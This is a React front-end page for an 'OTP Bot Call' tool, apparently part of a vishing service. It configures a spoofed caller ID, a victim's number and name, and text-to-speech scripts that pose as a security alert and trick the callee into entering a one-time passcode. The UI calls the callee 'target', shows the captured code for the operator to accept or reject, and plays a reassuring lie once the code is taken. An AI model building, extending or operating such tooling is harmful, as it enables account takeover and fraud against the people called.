import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Textarea } from '../components/ui/textarea';
import { Badge } from '../components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { ScrollArea } from '../components/ui/scroll-area';
import { 
    Phone, 
    PhoneCall,
    PhoneOff,
    CheckCircle2,
    XCircle,
    Play,
    Copy,
    Download,
    Settings,
    Terminal,
    User,
    Shield,
    Hash,
    Volume2,
    Send,
    ArrowRight
} from 'lucide-react';
import { toast } from 'sonner';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const VOICE_MODELS = [
    { value: 'Joanna', label: 'Joanna (US English Female)' },
    { value: 'Matthew', label: 'Matthew (US English Male)' },
    { value: 'Amy', label: 'Amy (UK English Female)' },
    { value: 'Brian', label: 'Brian (UK English Male)' },
];

const CALL_TYPES = [
    { value: 'password_change', label: 'Password Change Alert' },
    { value: 'login_verification', label: 'Login Verification' },
    { value: 'account_security', label: 'Account Security' },
    { value: 'transaction_alert', label: 'Transaction Alert' },
];

const OTPBotPage = () => {
    const [socket, setSocket] = useState(null);
    const [logs, setLogs] = useState([]);
    const [sessionId, setSessionId] = useState(null);
    const [sessionStatus, setSessionStatus] = useState(null);
    const [otpReceived, setOtpReceived] = useState(null);
    const [otpInput, setOtpInput] = useState('');
    const [isCallActive, setIsCallActive] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [currentStep, setCurrentStep] = useState(0);
    const logsEndRef = useRef(null);

    // Form state
    const [config, setConfig] = useState({
        recipient_number: '',
        caller_id: '',
        recipient_name: '',
        service_name: 'Account',
        otp_digits: 6,
        language: 'en',
        voice_name: 'Joanna',
        step1_message: 'Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.',
        step2_message: 'Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?',
        step3_message: 'Okay, please wait a moment while we verify the code.',
        accepted_message: 'Okay! We have declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!',
        rejected_message: 'I am sorry, but the code you entered is incorrect. Could you please enter it again? It should be {digits} digits.'
    });

    const [activeStep, setActiveStep] = useState('step1');

    // Scroll to bottom on new logs
    useEffect(() => {
        logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [logs]);

    // Connect to Socket.IO when session starts
    useEffect(() => {
        if (sessionId && !socket) {
            const newSocket = io(BACKEND_URL, {
                transports: ['websocket', 'polling'],
            });

            newSocket.on('connect', () => {
                console.log('Socket connected');
                newSocket.emit('join_session', { session_id: sessionId });
            });

            newSocket.on('call_log', (log) => {
                console.log('Log received:', log);
                setLogs(prev => [...prev, log]);
                
                if (log.type === 'otp' && log.data?.otp) {
                    setOtpReceived(log.data.otp);
                }
                if (log.type === 'success' && log.message.includes('completed')) {
                    setIsCallActive(false);
                    setCurrentStep(0);
                }
            });

            newSocket.on('disconnect', () => {
                console.log('Socket disconnected');
            });

            setSocket(newSocket);

            return () => {
                newSocket.close();
            };
        }
    }, [sessionId]);

    const getAuthHeaders = () => {
        const token = localStorage.getItem('token');
        return token ? { Authorization: `Bearer ${token}` } : {};
    };

    const handleInitiateCall = async () => {
        if (!config.recipient_number || !config.caller_id) {
            toast.error('Harap isi nomor penerima dan Caller ID');
            return;
        }

        setIsLoading(true);
        setLogs([]);
        setOtpReceived(null);
        setOtpInput('');
        setCurrentStep(1);

        try {
            const response = await axios.post(`${API}/otp/initiate-call`, config, {
                headers: getAuthHeaders()
            });

            setSessionId(response.data.session_id);
            setIsCallActive(true);
            setSessionStatus('step1');
            toast.success('Step 1 call initiated!');
        } catch (error) {
            console.error('Error initiating call:', error);
            toast.error(error.response?.data?.detail || 'Failed to initiate call');
            setCurrentStep(0);
        } finally {
            setIsLoading(false);
        }
    };

    const handleSendStep2 = async (input = '1') => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/step2/${sessionId}?first_input=${input}`, {}, {
                headers: getAuthHeaders()
            });
            setCurrentStep(2);
            setSessionStatus('step2');
            toast.success('Step 2 sent - Waiting for OTP input');
        } catch (error) {
            toast.error('Failed to send Step 2');
        } finally {
            setIsLoading(false);
        }
    };

    const handleSubmitOTP = async () => {
        if (!sessionId || !otpInput) {
            toast.error('Please enter OTP code');
            return;
        }
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/submit-otp/${sessionId}?otp_code=${otpInput}`, {}, {
                headers: getAuthHeaders()
            });
            setOtpReceived(otpInput);
            setCurrentStep(3);
            setSessionStatus('waiting_approval');
            toast.success('OTP submitted - Waiting for approval');
        } catch (error) {
            toast.error('Failed to submit OTP');
        } finally {
            setIsLoading(false);
        }
    };

    const handleAccept = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/accept/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.success('OTP Accepted - Call completed!');
            setIsCallActive(false);
            setCurrentStep(0);
        } catch (error) {
            toast.error('Failed to accept');
        } finally {
            setIsLoading(false);
        }
    };

    const handleReject = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/reject/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info('OTP Rejected - Retry message sent');
            setOtpReceived(null);
            setOtpInput('');
            setCurrentStep(2);
        } catch (error) {
            toast.error('Failed to reject');
        } finally {
            setIsLoading(false);
        }
    };

    const copyLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.message}`).join('\n');
        navigator.clipboard.writeText(logText);
        toast.success('Logs copied!');
    };

    const exportLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.type.toUpperCase()}: ${l.message}`).join('\n');
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `call_log_${sessionId || 'session'}.txt`;
        a.click();
    };

    const getLogIcon = (type) => {
        switch (type) {
            case 'success': return '✅';
            case 'error': return '❌';
            case 'dtmf': return '🔢';
            case 'otp': return '🕵️';
            case 'call': return '📞';
            case 'step': return '🎙️';
            case 'action': return '⚡';
            case 'warning': return '⚠️';
            default: return 'ℹ️';
        }
    };

    const getLogColor = (type) => {
        switch (type) {
            case 'success': return 'text-emerald-400';
            case 'error': return 'text-red-400';
            case 'dtmf': return 'text-cyan-400';
            case 'otp': return 'text-amber-400';
            case 'action': return 'text-violet-400';
            case 'warning': return 'text-yellow-400';
            default: return 'text-gray-300';
        }
    };

    return (
        <div className="space-y-6" data-testid="otp-bot-page">
            {/* Header */}
            <div className="flex items-center justify-between">
                <div>
                    <h1 className="text-2xl md:text-3xl font-black tracking-tight flex items-center gap-3">
                        <PhoneCall className="w-8 h-8 text-violet-400" />
                        <span>OTP <span className="text-gradient">Bot Call</span></span>
                    </h1>
                    <p className="text-gray-400 mt-1">Advanced Voice OTP Collection System</p>
                </div>
                <div className="flex items-center gap-3">
                    <Badge className={`${isCallActive ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-gray-500/20 text-gray-400'}`}>
                        {isCallActive ? '● Active Call' : '○ No Active Call'}
                    </Badge>
                    {currentStep > 0 && (
                        <Badge className="bg-violet-500/20 text-violet-400">
                            Step {currentStep}
                        </Badge>
                    )}
                </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-6">
                {/* Left Column - Configuration */}
                <div className="space-y-6">
                    {/* Call Configuration Card */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-4">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Settings className="w-5 h-5 text-violet-400" />
                                Call Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Call Type</Label>
                                    <Select defaultValue="password_change">
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {CALL_TYPES.map(type => (
                                                <SelectItem key={type.value} value={type.value}>{type.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Voice Model</Label>
                                    <Select 
                                        value={config.voice_name}
                                        onValueChange={(v) => setConfig({...config, voice_name: v})}
                                    >
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {VOICE_MODELS.map(model => (
                                                <SelectItem key={model.value} value={model.value}>{model.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Caller ID / From Number
                                    </Label>
                                    <Input
                                        data-testid="otp-caller-id"
                                        value={config.caller_id}
                                        onChange={(e) => setConfig({...config, caller_id: e.target.value})}
                                        placeholder="+12025551234"
                                        className="bg-[#0F111A] border-amber-500/30 font-mono"
                                        disabled={isCallActive}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <User className="w-3 h-3" />
                                        Recipient Name
                                    </Label>
                                    <Input
                                        value={config.recipient_name}
                                        onChange={(e) => setConfig({...config, recipient_name: e.target.value})}
                                        placeholder="John"
                                        className="bg-[#0F111A] border-white/10"
                                        disabled={isCallActive}
                                    />
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Recipient Number
                                    </Label>
                                    <Input
                                        data-testid="otp-recipient-number"
                                        value={config.recipient_number}
                                        onChange={(e) => setConfig({...config, recipient_number: e.target.value})}
                                        placeholder="+13362873517"
                                        className="bg-[#0F111A] border-white/10 font-mono"
                                        disabled={isCallActive}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Shield className="w-3 h-3" />
                                        Service Name
                                    </Label>
                                    <Input
                                        value={config.service_name}
                                        onChange={(e) => setConfig({...config, service_name: e.target.value})}
                                        placeholder="Account"
                                        className="bg-[#0F111A] border-white/10"
                                        disabled={isCallActive}
                                    />
                                </div>
                            </div>

                            <div className="space-y-2">
                                <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                    <Hash className="w-3 h-3" />
                                    OTP Digits
                                </Label>
                                <Select 
                                    value={config.otp_digits.toString()}
                                    onValueChange={(v) => setConfig({...config, otp_digits: parseInt(v)})}
                                    disabled={isCallActive}
                                >
                                    <SelectTrigger className="bg-[#0F111A] border-white/10 w-32">
                                        <SelectValue />
                                    </SelectTrigger>
                                    <SelectContent className="bg-[#12141F] border-white/10">
                                        <SelectItem value="4">4 digits</SelectItem>
                                        <SelectItem value="5">5 digits</SelectItem>
                                        <SelectItem value="6">6 digits</SelectItem>
                                        <SelectItem value="8">8 digits</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>
                        </CardContent>
                    </Card>

                    {/* Call Steps Configuration */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Volume2 className="w-5 h-5 text-cyan-400" />
                                Call Steps Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent>
                            <Tabs value={activeStep} onValueChange={setActiveStep}>
                                <TabsList className="grid grid-cols-5 bg-[#0F111A] mb-4">
                                    <TabsTrigger value="step1" className="text-xs data-[state=active]:bg-blue-600">Step 1</TabsTrigger>
                                    <TabsTrigger value="step2" className="text-xs data-[state=active]:bg-blue-600">Step 2</TabsTrigger>
                                    <TabsTrigger value="step3" className="text-xs data-[state=active]:bg-blue-600">Step 3</TabsTrigger>
                                    <TabsTrigger value="accepted" className="text-xs data-[state=active]:bg-emerald-600">Accepted</TabsTrigger>
                                    <TabsTrigger value="rejected" className="text-xs data-[state=active]:bg-red-600">Rejected</TabsTrigger>
                                </TabsList>

                                <TabsContent value="step1" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 1 - Greeting & Initial Verification</p>
                                    <Textarea
                                        value={config.step1_message}
                                        onChange={(e) => setConfig({...config, step1_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step2" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 2 - OTP Request</p>
                                    <Textarea
                                        value={config.step2_message}
                                        onChange={(e) => setConfig({...config, step2_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step3" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 3 - Verification Wait</p>
                                    <Textarea
                                        value={config.step3_message}
                                        onChange={(e) => setConfig({...config, step3_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="accepted" className="space-y-2">
                                    <p className="text-xs text-emerald-400">Accepted Message</p>
                                    <Textarea
                                        value={config.accepted_message}
                                        onChange={(e) => setConfig({...config, accepted_message: e.target.value})}
                                        className="bg-[#0F111A] border-emerald-500/30 min-h-[100px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="rejected" className="space-y-2">
                                    <p className="text-xs text-red-400">Rejected Message</p>
                                    <Textarea
                                        value={config.rejected_message}
                                        onChange={(e) => setConfig({...config, rejected_message: e.target.value})}
                                        className="bg-[#0F111A] border-red-500/30 min-h-[100px] text-sm"
                                    />
                                </TabsContent>
                            </Tabs>

                            {/* Action Button */}
                            <div className="mt-6">
                                <Button
                                    onClick={handleInitiateCall}
                                    disabled={isLoading || isCallActive}
                                    data-testid="initiate-call-btn"
                                    className="w-full bg-violet-600 hover:bg-violet-700 glow-primary"
                                >
                                    {isLoading ? (
                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2" />
                                    ) : (
                                        <Play className="w-4 h-4 mr-2" />
                                    )}
                                    {isCallActive ? 'Call in Progress' : 'Initiate Call (Step 1)'}
                                </Button>
                            </div>
                        </CardContent>
                    </Card>
                </div>

                {/* Right Column - Live Status & Logs */}
                <div className="space-y-6">
                    {/* Call Control Panel */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-4">
                            <CardTitle className="text-lg">Call Control Panel</CardTitle>
                        </CardHeader>
                        <CardContent>
                            {!isCallActive ? (
                                <div className="flex flex-col items-center justify-center py-8 text-gray-500">
                                    <PhoneCall className="w-16 h-16 opacity-30 mb-4" />
                                    <p>No active call</p>
                                    <p className="text-sm">Start a call to begin</p>
                                </div>
                            ) : (
                                <div className="space-y-4">
                                    {/* Step 1 -> Step 2 */}
                                    {currentStep === 1 && (
                                        <div className="p-4 rounded-lg bg-blue-500/10 border border-blue-500/30">
                                            <p className="text-sm text-blue-400 mb-3">Step 1 complete. What did target press?</p>
                                            <div className="flex gap-2">
                                                <Button
                                                    onClick={() => handleSendStep2('1')}
                                                    className="flex-1 bg-blue-600 hover:bg-blue-700"
                                                    disabled={isLoading}
                                                >
                                                    Pressed 1
                                                </Button>
                                                <Button
                                                    onClick={() => handleSendStep2('0')}
                                                    variant="outline"
                                                    className="flex-1"
                                                    disabled={isLoading}
                                                >
                                                    Pressed 0
                                                </Button>
                                            </div>
                                        </div>
                                    )}

                                    {/* Step 2 - OTP Input */}
                                    {currentStep === 2 && (
                                        <div className="p-4 rounded-lg bg-cyan-500/10 border border-cyan-500/30">
                                            <p className="text-sm text-cyan-400 mb-3">Step 2 playing. Enter OTP from target:</p>
                                            <div className="flex gap-2">
                                                <Input
                                                    value={otpInput}
                                                    onChange={(e) => setOtpInput(e.target.value.replace(/\D/g, ''))}
                                                    placeholder={`Enter ${config.otp_digits} digit OTP`}
                                                    maxLength={config.otp_digits}
                                                    className="bg-[#0F111A] border-cyan-500/30 font-mono text-xl text-center tracking-widest"
                                                    data-testid="otp-input"
                                                />
                                                <Button
                                                    onClick={handleSubmitOTP}
                                                    disabled={isLoading || otpInput.length < config.otp_digits}
                                                    className="bg-cyan-600 hover:bg-cyan-700"
                                                >
                                                    <Send className="w-4 h-4" />
                                                </Button>
                                            </div>
                                        </div>
                                    )}

                                    {/* Step 3 - Approval */}
                                    {currentStep === 3 && otpReceived && (
                                        <div className="space-y-4">
                                            <div className="text-center p-6 rounded-lg bg-amber-500/10 border border-amber-500/30">
                                                <p className="text-sm text-amber-400 mb-2">OTP Received</p>
                                                <p className="text-4xl font-mono font-bold text-white tracking-widest">
                                                    {otpReceived}
                                                </p>
                                            </div>
                                            <div className="flex gap-3">
                                                <Button
                                                    onClick={handleAccept}
                                                    data-testid="accept-otp-btn"
                                                    className="flex-1 bg-emerald-600 hover:bg-emerald-700"
                                                    disabled={isLoading}
                                                >
                                                    <CheckCircle2 className="w-4 h-4 mr-2" />
                                                    Accept
                                                </Button>
                                                <Button
                                                    onClick={handleReject}
                                                    data-testid="reject-otp-btn"
                                                    variant="destructive"
                                                    className="flex-1"
                                                    disabled={isLoading}
                                                >
                                                    <XCircle className="w-4 h-4 mr-2" />
                                                    Reject
                                                </Button>
                                            </div>
                                        </div>
                                    )}

                                    {/* Flow Indicator */}
                                    <div className="flex items-center justify-center gap-2 pt-4 border-t border-white/10">
                                        {[1, 2, 3].map((step) => (
                                            <React.Fragment key={step}>
                                                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                                                    currentStep >= step 
                                                        ? 'bg-violet-600 text-white' 
                                                        : 'bg-gray-700 text-gray-400'
                                                }`}>
                                                    {step}
                                                </div>
                                                {step < 3 && (
                                                    <ArrowRight className={`w-4 h-4 ${currentStep > step ? 'text-violet-400' : 'text-gray-600'}`} />
                                                )}
                                            </React.Fragment>
                                        ))}
                                    </div>
                                </div>
                            )}
                        </CardContent>
                    </Card>

                    {/* Live Call Log */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2 flex flex-row items-center justify-between">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Terminal className="w-5 h-5 text-emerald-400" />
                                Live Call Log
                            </CardTitle>
                            <div className="flex gap-2">
                                <Button variant="ghost" size="sm" onClick={copyLogs} className="text-gray-400 hover:text-white">
                                    <Copy className="w-4 h-4" />
                                </Button>
                                <Button variant="ghost" size="sm" onClick={exportLogs} className="text-gray-400 hover:text-white">
                                    <Download className="w-4 h-4" />
                                </Button>
                            </div>
                        </CardHeader>
                        <CardContent>
                            <ScrollArea className="h-[350px] pr-4">
                                <div className="space-y-2 font-mono text-sm">
                                    {logs.length === 0 ? (
                                        <p className="text-gray-500 text-center py-8">Waiting for call activity...</p>
                                    ) : (
                                        logs.map((log, index) => (
                                            <div 
                                                key={index} 
                                                className={`flex gap-2 ${getLogColor(log.type)}`}
                                            >
                                                <span className="text-gray-500">[{log.timestamp}]</span>
                                                <span>{getLogIcon(log.type)}</span>
                                                <span>{log.message}</span>
                                            </div>
                                        ))
                                    )}
                                    <div ref={logsEndRef} />
                                </div>
                            </ScrollArea>
                            {sessionId && (
                                <p className="text-xs text-gray-500 mt-4 font-mono">
                                    Session: {sessionId.substring(0, 8)}...
                                </p>
                            )}
                        </CardContent>
                    </Card>
                </div>
            </div>
        </div>
    );
};

export default OTPBotPage;
